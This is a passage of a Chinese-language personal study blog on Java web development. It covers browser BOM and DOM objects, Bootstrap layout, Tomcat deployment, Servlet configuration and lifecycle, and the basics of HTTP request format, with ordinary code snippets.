data-src="https://tva1.sinaimg.cn/large/e6c9d24ely1h4hd1zeqvkj213q0mg0v7.jpg"                      alt="image-20220724011212914"                ><figcaption>image-20220724011212914</figcaption></figure></p><h3 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h3><ul><li>Window：窗口对象</li></ul><ul><li>Navigator：浏览器对象</li><li>Screen：显示器屏幕对象</li><li>History：历史记录对象</li><li>Location：地址栏对象</li></ul><h3 id="Window：窗口对象"><a href="#Window：窗口对象" class="headerlink" title="Window：窗口对象"></a>Window：窗口对象</h3><ol><li><p>创建</p></li><li><p>方法</p><ol><li>与弹出框有关的方法：<ul><li>alert()显示带有一段消息和一个确认按钮的警告框。</li><li>confirm()显示带有一段消息以及确认按钮和取消按钮的对话框。<ul><li>如果用户点击确定按钮，则方法返回true</li><li>如果用户点击取消按钮，则方法返回false</li></ul></li><li>prompt()显示可提示用户输入的对话框。<ul><li>返回值：获取用户输入的值</li></ul></li></ul></li><li>与打开关闭有关的方法：<ul><li>close()关闭浏览器窗口。<ul><li>谁调用我 ，我关谁</li></ul></li><li>open()打开一个新的浏览器窗口<ul><li>返回新的Window对象</li></ul></li></ul></li><li>与定时器有关的方式<ul><li>setTimeout()在指定的毫秒数后调用函数或计算表达式。<ul><li>参数：<ol><li>js代码或者方法对象</li><li>毫秒值</li></ol></li><li>返回值：唯一标识，用于取消定时器</li></ul></li><li>clearTimeout()取消由 setTimeout() 方法设置的 timeout。</li><li>setInterval()按照指定的周期（以毫秒计）来调用函数或计算表达式。</li><li>clearInterval()取消由 setInterval() 设置的 timeout。</li></ul></li></ol></li><li><p>属性：</p><ol><li>获取其他BOM对象：<br>history<br>location<br>Navigator<br>Screen:</li><li>获取DOM对象<br>document</li></ol></li><li><p>特点</p><ul><li>Window对象不需要创建可以直接使用 window使用。 window.方法名();</li><li>window引用可以省略。  方法名();</li></ul></li></ol><h3 id="Location：地址栏对象"><a href="#Location：地址栏对象" class="headerlink" title="Location：地址栏对象"></a>Location：地址栏对象</h3><ol><li><p>创建(获取)：</p><ol><li>window.location</li><li>location</li></ol></li><li><p>方法：</p><ul><li>reload()重新加载当前文档。刷新</li></ul></li><li><p>属性</p><ul><li>href设置或返回完整的 URL。</li></ul></li></ol><h3 id="History：历史记录对象"><a href="#History：历史记录对象" class="headerlink" title="History：历史记录对象"></a>History：历史记录对象</h3><p>指当前windows窗口访问的记录</p><ol><li><p>创建(获取)：</p><ol><li>window.history</li><li>history</li></ol></li><li><p>方法：</p><ul><li>back()加载 history 列表中的前一个 URL。</li><li>forward()加载 history 列表中的下一个 URL。</li><li>go(参数)加载 history 列表中的某个具体页面。<ul><li>参数：<ul><li>正数：前进几个历史记录</li><li>负数：后退几个历史记录</li></ul></li></ul></li></ul></li><li><p>属性：</p><ul><li>length返回当前窗口历史列表中的 URL 数量。</li></ul></li></ol><h1 id="DOM-1"><a href="#DOM-1" class="headerlink" title="DOM"></a>DOM</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><ul><li><p>概念： Document Object Model 文档对象模型</p><ul><li>将标记语言文档的各个组成部分，封装为对象。可以使用这些对象，对标记语言文档进行CRUD的动态操作</li></ul></li><li><p>W3C DOM 标准被分为 3 个不同的部分：</p><ul><li>核心 DOM - 针对任何结构化文档的标准模型<ul><li><p>Document：文档对象</p></li><li><p>Element：元素对象</p></li><li><p>Attribute：属性对象</p></li><li><p>Text：文本对象(不能有子节点)</p></li><li><p>Comment:注释对象</p></li><li><p>Node：节点对象，其他5个的父对象</p></li></ul></li><li>XML DOM - 针对 XML 文档的标准模型</li><li>HTML DOM - 针对 HTML 文档的标准模型</li></ul></li></ul><h2 id="核心DOM模型"><a href="#核心DOM模型" class="headerlink" title="核心DOM模型"></a>核心DOM模型</h2><h3 id="Document：文档对象"><a href="#Document：文档对象" class="headerlink" title="Document：文档对象"></a>Document：文档对象</h3><ol><li>创建(获取)：在html dom模型中可以使用window对象来获取<br>1. window.document<br> 2. document</li><li>方法：<ol><li>获取Element对象：<ol><li>getElementById()： 根据id属性值获取元素对象。id属性值一般唯一</li><li>getElementsByTagName()：根据标签名称获取元素对象们。返回值是一个数组</li><li>getElementsByClassName():根据Class属性值获取元素对象们。返回值是一个数组</li><li>getElementsByName(): 根据name属性值获取元素对象们。返回值是一个数组</li></ol></li><li>创建其他DOM对象：<ul><li>createAttribute(name)</li><li>createComment()</li><li>createElement()</li><li>createTextNode()</li></ul></li><li>属性</li></ol></li></ol><h3 id="Element：元素对象"><a href="#Element：元素对象" class="headerlink" title="Element：元素对象"></a>Element：元素对象</h3><ol><li>获取/创建：通过document来获取和创建</li><li>方法：<ol><li>removeAttribute()：删除属性</li><li>setAttribute()：设置属性</li></ol></li></ol><h3 id="Node：节点对象，其他5个的父对象"><a href="#Node：节点对象，其他5个的父对象" class="headerlink" title="Node：节点对象，其他5个的父对象"></a>Node：节点对象，其他5个的父对象</h3><pre><code>* 特点：所有dom对象都可以被认为是一个节点* 方法：    * CRUD dom树：        * appendChild()：向节点的子节点列表的结尾添加新的子节点。        * removeChild()：删除（并返回）当前节点的指定子节点。        * replaceChild()：用新节点替换一个子节点。* 属性：    * parentNode 返回节点的父节点。</code></pre><h3 id="HTML-DOM"><a href="#HTML-DOM" class="headerlink" title="HTML DOM"></a>HTML DOM</h3><ol><li><p>标签体的设置和获取：innerHTML</p></li><li><p>使用html元素对象的属性</p></li><li><p>控制元素样式</p><ol><li><p>使用元素的style属性来设置<br>如：</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//修改样式方式1</span></span><br><span class="line">div1.<span class="property">style</span>.<span class="property">border</span> = <span class="string">&quot;1px solid red&quot;</span>;</span><br><span class="line">div1.<span class="property">style</span>.<span class="property">width</span> = <span class="string">&quot;200px&quot;</span>;</span><br><span class="line"><span class="comment">//font-size--&gt; fontSize</span></span><br><span class="line">div1.<span class="property">style</span>.<span class="property">fontSize</span> = <span class="string">&quot;20px&quot;</span>;</span><br></pre></td></tr></table></figure></div></li><li><p>提前定义好类选择器的样式，通过元素的className属性来设置其class属性值。</p></li></ol></li></ol><h1 id="Bootstrap"><a href="#Bootstrap" class="headerlink" title="Bootstrap"></a>Bootstrap</h1><h2 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h2><ol><li>概念： 一个前端开发的框架，Bootstrap，来自 Twitter，是目前很受欢迎的前端框架。Bootstrap 是基于 HTML、CSS、JavaScript 的，它简洁灵活，使得 Web 开发更加快捷。<ul><li>框架:一个半成品软件，开发人员可以在框架基础上，在进行开发，简化编码。</li><li>好处：<ol><li>定义了很多的css样式和js插件。我们开发人员直接可以使用这些样式和插件得到丰富的页面效果。</li><li>响应式布局。<ul><li>同一套页面可以兼容不同分辨率的设备。</li></ul></li></ol></li></ul></li></ol><h2 id="快速入门-2"><a href="#快速入门-2" class="headerlink" title="快速入门"></a>快速入门</h2><ol><li>下载Bootstrap</li><li>在项目中将这三个文件夹复制</li><li>创建html页面，引入必要的资源文件</li></ol><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 上述3个meta标签*必须*放在最前面，任何其他内容都*必须*跟随其后！ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Bootstrap test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Bootstrap --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./css/bootstrap.min.css&quot;</span> &gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- jQuery (Bootstrap 的所有 JavaScript 插件都依赖 jQuery，所以必须放在前边) --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./js/jquery-3.2.1.min.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 加载 Bootstrap 的所有 JavaScript 插件。你也可以根据需要只加载单个插件。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./js/bootstrap.min.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>你好，世界！<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h2 id="响应式布局"><a href="#响应式布局" class="headerlink" title="响应式布局"></a>响应式布局</h2><ul><li><p>同一套页面可以兼容不同分辨率的设备。</p></li><li><p>实现：依赖于栅格系统：将一行平均分成12个格子，可以指定元素占几个格子</p></li><li><p>步骤：</p><ol><li>定义容器。相当于之前的table、<ul><li>容器分类：<ol><li>container：两边留白</li><li>container-fluid：每一种设备都是100%宽度</li></ol></li></ul></li><li>定义行。相当于之前的tr   样式：row</li><li>定义元素。指定该元素在不同的设备上，所占的格子数目。样式：col-设备代号-格子数目<ul><li>设备代号：<ol><li>xs：超小屏幕 手机 (<768px)：<code>col-xs-12</code></li><li>sm：小屏幕 平板 (≥768px)</li><li>md：中等屏幕 桌面显示器 (≥992px)</li><li>lg：大屏幕 大桌面显示器 (≥1200px)</li></ol></li></ul></li></ol><ul><li>注意：<ol><li>一行中如果格子数目超过12，则超出部分自动换行。</li><li>栅格类属性可以向上兼容。栅格类适用于与屏幕宽度大于或等于分界点大小的设备。</li><li>如果真实设备宽度小于了设置栅格类属性的设备代码的最小值，会一个元素占满一整行。</li></ol></li></ul></li></ul><h2 id="CSS样式和JS插件"><a href="#CSS样式和JS插件" class="headerlink" title="CSS样式和JS插件"></a>CSS样式和JS插件</h2><ol><li><p>全局CSS样式：</p><ul><li><p>按钮：class="btn btn-default"</p></li><li><p>图片：</p><ul><li>class="img-responsive"：图片在任意尺寸都占100%</li><li>图片形状<ul><li><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../../../Desktop/       /web学习/📒/..."                      alt="..." class="img-rounded"                ><figcaption>...</figcaption></figure>：方形</li><li><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../../../Desktop/       /web学习/📒/..."                      alt="..." class="img-circle"                ><figcaption>...</figcaption></figure> ： 圆形</li><li><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../../../Desktop/       /web学习/📒/..."                      alt="..." class="img-thumbnail"                ><figcaption>...</figcaption></figure> ：相框</li></ul></li></ul><blockquote><p>一个标签可以有多个class属性</p><p>alt属性提供替代图片的信息，使屏幕阅读器能获取到关于图片的信息</p></blockquote></li><li><p>表格</p><ul><li>table</li><li>table-bordered</li><li>table-hover</li></ul></li><li><p>表单</p><ul><li>给表单项添加：class="form-control"</li></ul></li></ul></li><li><p>组件：</p><ul><li>导航条</li><li>分页条</li></ul></li><li><p>插件：</p><ul><li>轮播图</li></ul></li></ol><h2 id="一些注意事项"><a href="#一些注意事项" class="headerlink" title="一些注意事项"></a>一些注意事项</h2><ul><li>赋值函数时，不要加括号，只写函数名才表示对象</li></ul><h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><p>tomcat bin目录下</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sh ./startup.sh</span><br></pre></td></tr></table></figure></div><p>访问localhost:8080</p><blockquote><p>可以通过配置文件设置端口为80，80端口号是http协议的默认端口号，访问网址不需要加端口号</p></blockquote><h2 id="关闭"><a href="#关闭" class="headerlink" title="关闭"></a>关闭</h2><p>tomcat bin目录下</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sh ./shutdown.sh</span><br></pre></td></tr></table></figure></div><h2 id="部署项目方式"><a href="#部署项目方式" class="headerlink" title="部署项目方式"></a>部署项目方式</h2><h3 id="1-直接将项目放到webapps目录下即可"><a href="#1-直接将项目放到webapps目录下即可" class="headerlink" title="1.直接将项目放到webapps目录下即可"></a>1.直接将项目放到webapps目录下即可</h3><p>项目以文件夹分开</p><ul><li>/hello：项目的访问路径-->虚拟目录</li><li>简化部署：将项目打成一个war包，再将war包放置到webapps目录下。<br>- war包会自动解压缩</li></ul><blockquote><p>war包加入webapps目录时会自动添加同名文件夹，删除war包也会自动删除文件夹</p></blockquote><h3 id="2-配置conf-server-xml文件"><a href="#2-配置conf-server-xml文件" class="headerlink" title="2.配置conf/server.xml文件"></a>2.配置conf/server.xml文件</h3><p>在<Host>标签体中配置<br><code>&lt;Context docBase=&quot;D:\hello&quot; path=&quot;/hehe&quot; /&gt;</code></p><ul><li>docBase:项目存放的路径</li><li>path：虚拟目录</li></ul><blockquote><p>网页访问的时候用虚拟目录</p><p>但不安全,修改server.xml必须重启tomcat</p></blockquote><h3 id="3-在conf-Catalina-localhost创建任意名称的xml文件。"><a href="#3-在conf-Catalina-localhost创建任意名称的xml文件。" class="headerlink" title="3.在conf\Catalina\localhost创建任意名称的xml文件。"></a>3.在conf\Catalina\localhost创建任意名称的xml文件。</h3><p>在文件中编写</p><p><code>&lt;Context docBase=&quot;D:\hello&quot; /&gt;</code></p><ul><li>虚拟目录：xml文件的名称</li></ul><blockquote><p>比如创建了context.xml在localhost文件夹下，内容为</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Context</span> <span class="attr">docBase</span>=<span class="string">&quot;/Users/sloth/Sites/localhost/xxe-lab&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></div><p>只需要访问<a class="link"   href="http://localhost:8080/context/php_XXE/" >http://localhost:8080/context/php_XXE/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><h2 id="静态目录和动态目录"><a href="#静态目录和动态目录" class="headerlink" title="静态目录和动态目录"></a>静态目录和动态目录</h2><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><p>java动态项目的目录结构：</p><p>-- 项目的根目录（ROOT）<br>    -- WEB-INF目录：<br>        -- web.xml：web项目的核心配置文件<br>        -- classes目录：放置字节码文件的目录<br>        -- lib目录：放置依赖的jar包</p><h3 id="将Tomcat集成到IDEA中并且创建JavaEE的项目部署项目"><a href="#将Tomcat集成到IDEA中并且创建JavaEE的项目部署项目" class="headerlink" title="将Tomcat集成到IDEA中并且创建JavaEE的项目部署项目"></a>将Tomcat集成到IDEA中并且创建JavaEE的项目部署项目</h3><h1 id="Servelet-server-applet"><a href="#Servelet-server-applet" class="headerlink" title="Servelet--server applet"></a>Servelet--server applet</h1><h3 id="概念：运行在服务器端的小程序"><a href="#概念：运行在服务器端的小程序" class="headerlink" title="概念：运行在服务器端的小程序"></a>概念：运行在服务器端的小程序</h3><ul><li>Servlet就是一个接口，定义了Java类被浏览器访问到(tomcat识别)的规则。</li><li>将来我们自定义一个类，实现Servlet接口，复写方法。</li></ul><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24ely1h5ier7fakoj212a0howfv.jpg"                      alt="image-20220825021654848"                ><figcaption>image-20220825021654848</figcaption></figure></p><blockquote><p>Servlet相关类和方法在Java EE中</p></blockquote><h2 id="快速入门-3"><a href="#快速入门-3" class="headerlink" title="快速入门"></a>快速入门</h2><ol><li><p>创建JavaEE项目</p></li><li><p>定义一个类，实现Servlet接口</p><ul><li>public class ServletDemo1 implements Servlet</li></ul><p></p></li><li><p>实现接口中的抽象方法</p></li><li><p>配置Servlet<br>在web.xml中配置：</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--配置Servlet --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--给class重新定了个名字 servlet-name标签内容--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>demo1<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.itcast.web.servlet.ServletDemo1<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--通过 /demo1 访问命名为demo1的类--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>demo1<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/demo1<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li></ol><h2 id="执行原理"><a href="#执行原理" class="headerlink" title="执行原理"></a>执行原理</h2><ol><li><p>当服务器接受到客户端浏览器的请求后，会解析请求URL路径，获取访问的Servlet的资源路径</p></li><li><p>查找web.xml文件，是否有对应的<url-pattern>标签体内容。</p></li><li><p>如果有，则在找到对应的<servlet-class>全类名</p></li><li><p>tomcat会将字节码文件加载进内存，并且创建其对象</p></li><li><p>调用其方法</p></li></ol><h2 id="生命周期方法"><a href="#生命周期方法" class="headerlink" title="生命周期方法"></a>生命周期方法</h2><h3 id="被创建：执行init方法，只执行一次"><a href="#被创建：执行init方法，只执行一次" class="headerlink" title="被创建：执行init方法，只执行一次"></a>被创建：执行init方法，只执行一次</h3><h4 id="Servlet什么时候被创建？"><a href="#Servlet什么时候被创建？" class="headerlink" title="Servlet什么时候被创建？"></a>Servlet什么时候被创建？</h4><ul><li><p>默认情况下，第一次被访问时，Servlet被创建</p></li><li><p>可以配置执行Servlet的创建时机。 web.xml中</p><ul><li><p>在<servlet>标签下配置</p><ol><li><p>第一次被访问时，创建</p><ul><li><load-on-startup>的值为负数 默认值为-1</li></ul></li><li><p>在服务器启动时，创建</p><ul><li><p><load-on-startup>的值为0或正整数 一般配0-10</p><blockquote><p>越小的整数优先级越高</p></blockquote></li></ul></li></ol></li></ul></li></ul><ul><li>Servlet的init方法，只执行一次，说明一个Servlet在内存中只存在一个对象，Servlet是单例的</li><li>多个用户同时访问时，可能存在线程安全问题。<br>* 解决：尽量不要在Servlet中定义成员变量。即使定义了成员变量，也不要对修改值</li></ul><h3 id="提供服务：执行service方法，执行多次"><a href="#提供服务：执行service方法，执行多次" class="headerlink" title="提供服务：执行service方法，执行多次"></a>提供服务：执行service方法，执行多次</h3><ul><li>每次访问Servlet时，Service方法都会被调用一次。</li></ul><h3 id="被销毁：执行destroy方法，只执行一次"><a href="#被销毁：执行destroy方法，只执行一次" class="headerlink" title="被销毁：执行destroy方法，只执行一次"></a>被销毁：执行destroy方法，只执行一次</h3><ul><li>Servlet被销毁时执行。服务器关闭时，Servlet被销毁</li><li>只有服务器<u>正常关闭</u>时，才会执行destroy方法。</li><li>destroy方法在Servlet被销毁之前执行，一般用于释放资源</li></ul><h2 id="注解配置"><a href="#注解配置" class="headerlink" title="注解配置"></a>注解配置</h2><ul><li><p>Servlet3.0：</p><ul><li>好处：支持注解配置。可以不需要web.xml了。</li></ul></li><li><p>步骤：</p><ol><li><p>创建JavaEE项目，选择Servlet的版本3.0以上，可以不创建web.xml</p></li><li><p>定义一个类，实现Servlet接口</p></li><li><p>复写方法</p></li><li><p>在类上使用@WebServlet注解，进行配置</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;资源路径&quot;)</span></span><br><span class="line"><span class="meta">@WebServlet(urlPatterns = &quot;/demo&quot;)</span> <span class="comment">//通过/demo访问</span></span><br><span class="line"><span class="meta">@WebServlet(value = &quot;/demo&quot;)</span></span><br><span class="line"><span class="meta">@WebServlet(&quot;/demo&quot;)</span> <span class="comment">//最简洁</span></span><br></pre></td></tr></table></figure></div></li></ol></li></ul><p>该注解具体实现</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Target(&#123;ElementType.TYPE&#125;)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> WebServlet &#123;</span><br><span class="line">    String <span class="title function_">name</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;<span class="comment">//相当于&lt;Servlet-name&gt;</span></span><br><span class="line"></span><br><span class="line">    String[] value() <span class="keyword">default</span> &#123;&#125;;<span class="comment">//代表urlPatterns()属性配置</span></span><br><span class="line"></span><br><span class="line">    String[] urlPatterns() <span class="keyword">default</span> &#123;&#125;;<span class="comment">//相当于&lt;url-pattern&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">loadOnStartup</span><span class="params">()</span> <span class="keyword">default</span> -<span class="number">1</span>;<span class="comment">//相当于&lt;load-on-startup&gt;</span></span><br><span class="line"></span><br><span class="line">    WebInitParam[] initParams() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">asyncSupported</span><span class="params">()</span> <span class="keyword">default</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">smallIcon</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">largeIcon</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">description</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">displayName</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="IDEA与tomcat的相关配置"><a href="#IDEA与tomcat的相关配置" class="headerlink" title="IDEA与tomcat的相关配置"></a>IDEA与tomcat的相关配置</h2><ol><li><p>IDEA会为每一个tomcat部署的项目单独建立一份配置文件</p><ul><li>查看控制台的log：Using CATALINA_BASE:   "/Users/sloth/Library/Caches/JetBrains/IntelliJIdea2021.3/tomcat/156bc142-4965-43d6-8ff6-003e52b2fb0f"</li></ul></li><li><p>工作空间项目和tomcat部署的web项目</p><ul><li>tomcat真正访问的是“tomcat部署的web项目”，"tomcat部署的web项目"对应着"工作空间项目" 的web目录下的所有资源</li><li>WEB-INF目录下的资源不能被浏览器直接访问。</li></ul></li><li><p>断点调试：使用"小虫子"启动 dubug 启动</p></li></ol><h2 id="Servlet的体系结构"><a href="#Servlet的体系结构" class="headerlink" title="Servlet的体系结构"></a>Servlet的体系结构</h2><p>Servlet -- 接口<br>        |<br>GenericServlet -- 抽象类<br>        |<br>HttpServlet  -- 抽象类</p><ul><li><p>GenericServlet：将Servlet接口中其他的方法做了默认空实现，只将service()方法作为抽象</p></li><li><p>将来定义Servlet类时，可以继承GenericServlet，实现service()方法即可</p></li></ul><ul><li>HttpServlet：对http协议的一种封装，简化操作<br>1. 定义类继承HttpServlet<br> 2. 只需要复写doGet/doPost/。。。(HTTP7种请求方式)方法，对get post等方式接收对数据处理方法</li></ul><blockquote><p>浏览器直接访问网址，默认发送get请求</p></blockquote><h2 id="Servlet相关配置"><a href="#Servlet相关配置" class="headerlink" title="Servlet相关配置"></a>Servlet相关配置</h2><p>urlpartten:Servlet访问路径</p><ul><li>一个Servlet可以定义多个访问路径 ： @WebServlet({"/d4","/dd4","/ddd4"})</li><li>路径定义规则<ol><li>/xxx：路径匹配</li><li>/xxx/xxx:多层路径，目录结构 <code>/test/*</code> (*通配符可以匹配任意，因此这个表示只要访问test后跟任意目录，<code>*</code>的优先级较低)</li><li>*.do：扩展名匹配 (do可以改成任意后缀名，前面不加/)</li></ol></li></ul><h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><h3 id="概念：Hyper-Text-Transfer-Protocol-超文本传输协议"><a href="#概念：Hyper-Text-Transfer-Protocol-超文本传输协议" class="headerlink" title="概念：Hyper Text Transfer Protocol 超文本传输协议"></a>概念：Hyper Text Transfer Protocol 超文本传输协议</h3><ul><li><p>传输协议：定义了，客户端和服务器端通信时，发送数据的格式</p></li><li><p>特点：</p><ol><li>基于TCP/IP的高级协议</li><li>默认端口号:80</li><li>基于请求/响应模型的:一次请求对应一次响应</li><li>无状态的：每次请求之间相互独立，不能交互数据</li></ol></li><li><p>历史版本：<br>* 1.0：每一次请求响应都会建立新的连接<br>* 1.1：复用连接</p></li></ul><h2 id="数据格式"><a href="#数据格式" class="headerlink" title="数据格式"></a>数据格式</h2><h3 id="请求消息数据格式"><a href="#请求消息数据格式" class="headerlink" title="请求消息数据格式"></a>请求消息数据格式</h3><ol><li><p>请求行</p><ul><li><p>格式： 请求方式 请求url 请求协议/版本</p><div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /login.htmlHTTP/1.1</span><br></pre></td></tr></table></figure></div></li></ul><ul><li>请求方式：<br>HTTP协议有7中请求方式，常用的有2种<ul><li>GET：<ol><li>请求参数在请求行中，在url后。</li><li>请求的url长度有限制的</li><li>不太安全</li></ol></li><li>POST:<ol><li>请求参数在请求体中</li><li>请求的url长度没有限制的</li><li>相对安全</li></ol></li></ul></li></ul></li><li><p>请求头: 客户端浏览器告诉服务器一些信息</p><ul><li><p>格式：请求头名称: 请求头值</p></li><li><p>常见的请求头：</p><ol><li><p>User-Agent：浏览器告诉服务器，我访问你使用的浏览器版本信息</p><ul><li>可以在服务器端获取该头的信息，解决浏览器的兼容性问题</li></ul></li><li><p>Referer：<a class="link"   href="http://localhost/login.html" >http://localhost/login.html <i class="fa-regular fa-arrow-up-right-from-square 